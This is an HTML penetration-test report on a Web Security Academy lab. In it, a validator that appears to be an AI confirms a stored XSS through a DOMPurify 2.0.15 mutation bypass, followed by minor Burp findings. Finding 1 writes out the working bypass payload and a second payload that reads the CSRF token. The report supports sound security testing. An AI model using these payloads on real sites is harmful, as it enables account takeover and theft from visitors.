@@ -1,0 +1,771 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr6kk8hi-fr101h</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-stored] Stored XSS in blog comment via DOMPurify 2.0.15 mutation-XSS bypass</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#c9a227">LOW</span> [burp?] Open redirection (DOM-based)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [burp] Strict transport security not enforced (2 URLs)</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] TLS certificate</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr6kk8hi-fr101h</code></td></tr>
+<tr><td>Target</td><td><code>https://0abb00c50377a549817352fe00530037.web-security-academy.net/</code></td></tr>
+<tr><td>Started</td><td>2026-07-04T16:21:06.955Z</td></tr>
+<tr><td>Generated</td><td>2026-07-06T05:43:21.731Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>11 mapped · 11 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>*.web-security-academy.net</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#c9a227">2</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [xss-stored] Stored XSS in blog comment via DOMPurify 2.0.15 mutation-XSS bypass</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target https://0abb00c50377a549817352fe00530037.web-security-academy.net/</div>
+<div class="desc">The blog comment form (POST /post/comment) persists the `comment` field verbatim; the front-end fetches comments via GET /post/comment (JSON) and renders the comment body into the DOM through DOMPurify 2.0.15 (script at /resources/js/domPurify-2.0.15.js). DOMPurify &lt; 2.0.17 is vulnerable to a namespace-confusion mutation-XSS (mXSS) bypass. A standard payload (&lt;img src=x onerror=...&gt;) is correctly stripped by DOMPurify (negative control: no execution), but the mutation payload &lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=...&gt; survives sanitization and mutates on innerHTML assignment into an executing &lt;img onerror&gt;. The stored comment executes attacker JavaScript in the browser of EVERY visitor who views the post (persistent / cross-user). Confirmed by EXECUTION, not reflection: the payload document.title='PWNXSS'+40*50 set the document title to the COMPUTED value &quot;PWNXSS2000&quot;. A follow-up stored payload read the DOM anti-CSRF token and exfiltrated it into the title (&quot;vL8lDaJTkia8yqYqdBgsk6sxqL8tbMPp&quot;), demonstrating full script access to the page (session/CSRF-token theft, actions on behalf of the victim). GET /post/comment returns the payload raw/unsanitized (no server-side output encoding); the only defense is the bypassable client-side DOMPurify.</div>
+<div><b>Reproduction</b></div><pre>1. Browse to /post?postId=1 and submit a comment with body: &lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;img src onerror=&quot;document.title='PWNXSS'+40*50&quot;&gt; (name/email required; the form auto-supplies a valid CSRF token). 2. Reload /post?postId=1; the loader renders the comment body via DOMPurify.sanitize(...) into innerHTML; the mXSS bypass mutates into &lt;img onerror&gt; and fires. 3. document.title becomes &quot;PWNXSS2000&quot; — the computed product 40*50 — proving JS execution. Negative control: a standard &lt;img src=x onerror=&quot;document.title='CTRLXSS'+40*50&quot;&gt; leaves the title as &quot;Mystery challenge&quot; (DOMPurify strips it). Positive replays: GET /post/comment?postId=1 (ev-mr6lql0s-i, ev-mr6lqpaf-j) return the raw stored payload; control GET /post/comment?postId=2 (ev-mr6lqgrt-h) does not contain it. Impact shown: a third payload exfiltrated the page anti-CSRF token via document.title.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6lqgrt-h</code> — <code>artifacts/s-0002/ev-mr6lqgrt-h/</code></div><div class="lbl">REQUEST</div><pre>GET /post/comment?postId=2 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 720
+content-type: application/json; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+[{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-20T03:01:09.257Z&quot;,&quot;body&quot;:&quot;Amusing, enticing and well put together. But enough from my dating profile, good blog&quot;,&quot;author&quot;:&quot;Andy Tool&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-25T06:58:53.943Z&quot;,&quot;body&quot;:&quot;The next time I tell a stranger on the internet that they need to educate themselves, I'll send them a link to this.&quot;,&quot;author&quot;:&quot;Jin Galbells&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-26T03:20:15.611Z&quot;,&quot;body&quot;:&quot;My best friend Steve ran off with my wife yesterday. Well, he's only been my best friend since yesterday.&quot;,&quot;author&quot;:&quot;Neil Beforeme&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-26T07:23:26.055Z&quot;,&quot;body&quot;:&quot;I love that you write in that font.&quot;,&quot;author&quot;:&quot;Carrie Atune&quot;}]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6lql0s-i</code> — <code>artifacts/s-0002/ev-mr6lql0s-i/</code></div><div class="lbl">REQUEST</div><pre>GET /post/comment?postId=1 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1078
+content-type: application/json; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+[{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-23T04:49:56.986Z&quot;,&quot;body&quot;:&quot;Do you care what people think of you?&quot;,&quot;author&quot;:&quot;Cindy Music&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-02T17:33:59.456Z&quot;,&quot;body&quot;:&quot;I found myself asking a lot of questions after reading this blog, like how many stops have I missed me station by?&quot;,&quot;author&quot;:&quot;Bill Please&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;https://example.com&quot;,&quot;date&quot;:&quot;2026-07-04T16:41:50.561510261Z&quot;,&quot;body&quot;:&quot;Just a normal comment about resumes.&quot;,&quot;author&quot;:&quot;BenignUser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:50:11.507025660Z&quot;,&quot;body&quot;:&quot;&lt;img src=x onerror=\&quot;document.title='CTRLXSS'+40*50\&quot;&gt;&quot;,&quot;author&quot;:&quot;ctrluser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:50:44.340917328Z&quot;,&quot;body&quot;:&quot;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;\/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;\/math&gt;&lt;img src onerror=\&quot;document.title='PWNXSS'+40*50\&quot;&gt;&quot;,&quot;author&quot;:&quot;posuser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:52:30.154608598Z&quot;,&quot;body&quot;:&quot;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;\/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;\/math&gt;&lt;img src onerror=\&quot;document.title=document.querySelector('[name=csrf]').value\&quot;&gt;&quot;,&quot;author&quot;:&quot;exfil&quot;}]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6lqpaf-j</code> — <code>artifacts/s-0002/ev-mr6lqpaf-j/</code></div><div class="lbl">REQUEST</div><pre>GET /post/comment?postId=1 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1078
+content-type: application/json; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+[{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-06-23T04:49:56.986Z&quot;,&quot;body&quot;:&quot;Do you care what people think of you?&quot;,&quot;author&quot;:&quot;Cindy Music&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-02T17:33:59.456Z&quot;,&quot;body&quot;:&quot;I found myself asking a lot of questions after reading this blog, like how many stops have I missed me station by?&quot;,&quot;author&quot;:&quot;Bill Please&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;https://example.com&quot;,&quot;date&quot;:&quot;2026-07-04T16:41:50.561510261Z&quot;,&quot;body&quot;:&quot;Just a normal comment about resumes.&quot;,&quot;author&quot;:&quot;BenignUser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:50:11.507025660Z&quot;,&quot;body&quot;:&quot;&lt;img src=x onerror=\&quot;document.title='CTRLXSS'+40*50\&quot;&gt;&quot;,&quot;author&quot;:&quot;ctrluser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:50:44.340917328Z&quot;,&quot;body&quot;:&quot;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;\/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;\/math&gt;&lt;img src onerror=\&quot;document.title='PWNXSS'+40*50\&quot;&gt;&quot;,&quot;author&quot;:&quot;posuser&quot;},{&quot;avatar&quot;:&quot;&quot;,&quot;website&quot;:&quot;&quot;,&quot;date&quot;:&quot;2026-07-04T16:52:30.154608598Z&quot;,&quot;body&quot;:&quot;&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;\/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;\/math&gt;&lt;img src onerror=\&quot;document.title=document.querySelector('[name=csrf]').value\&quot;&gt;&quot;,&quot;author&quot;:&quot;exfil&quot;}]</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 2. [burp?] Open redirection (DOM-based)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">⚠ AI re-test could not reproduce (severity kept, manual confirmation advised): DOM-based finding: control (postId=1) and both attack requests (url=/redirect= to attacker host) all returned an identical 200 with 10649-byte body and NO Location header / no 3xx — no server-side redirect effect exists to reproduce via raw HTTP; a DOM redirect only fires in a JS engine, so automated re-test cannot confirm it (kept for manual browser review).
+
+The application may be vulnerable to DOM-based open redirection. Data is read from &lt;b&gt;location.search&lt;/b&gt; and passed to &lt;b&gt;xhr.open&lt;/b&gt;. (confidence: TENTATIVE) @ https://0abb00c50377a549817352fe00530037.web-security-academy.net/post</div>
+<div><b>Reproduction</b></div><pre>Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r5ls8-80</code> — <code>artifacts/_/ev-mr6r5ls8-80/</code></div><div class="lbl">REQUEST</div><pre>GET /post HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+
+GET /post?postId=1 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 10649
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsBlog.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;blog&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;div class=&quot;blog-post&quot;&gt;
+                    &lt;img src=&quot;/image/blog/posts/21.jpg&quot;&gt;
+                    &lt;h1&gt;The Do&amp;apos;s &amp;amp; Don&amp;apos;ts of Writing Your Resume&lt;/h1&gt;
+                    &lt;p&gt;&lt;span id=blog-author&gt;Dean N&amp;apos;Mean&lt;/span&gt; | 10 June 2026&lt;/p&gt;
+                    &lt;hr&gt;
+                    &lt;p&gt;We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&amp;apos;t make it a sweaty limp one.&lt;/p&gt;
+                    &lt;p&gt;The first thing to remember is don&amp;apos;t try and be funny in your job descriptions. If you&amp;apos;ve been working with children the employer doesn&amp;apos;t want to read &amp;apos;could have given them a smack most days, but loved them really&amp;apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.&lt;/p&gt;
+                    &lt;p&gt;Swearing is usually frowned upon. Just because you&amp;apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&amp;apos;t mean it&amp;apos;s true, or that you should use bad language in your profile.&lt;/p&gt;
+                    &lt;p&gt;If you are presenting a hard copy of your resume at interview your future boss doesn&amp;apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.&lt;/p&gt;
+                    &lt;p&gt;Don&amp;apos;t include anything you can&amp;apos;t live up to. Applying to become a ski instructor when you can&amp;apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&amp;apos;t do it don&amp;apos;t include it. Picture everyone&amp;apos;s embarrassment when you have stated you can &amp;apos;do it blindfolded&amp;apos; and you knock over the 15th-century porcelain vase contai</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r6ptl-82</code> — <code>artifacts/_/ev-mr6r6ptl-82/</code></div><div class="lbl">REQUEST</div><pre>GET /post?postId=1 HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 3689
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsBlog.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
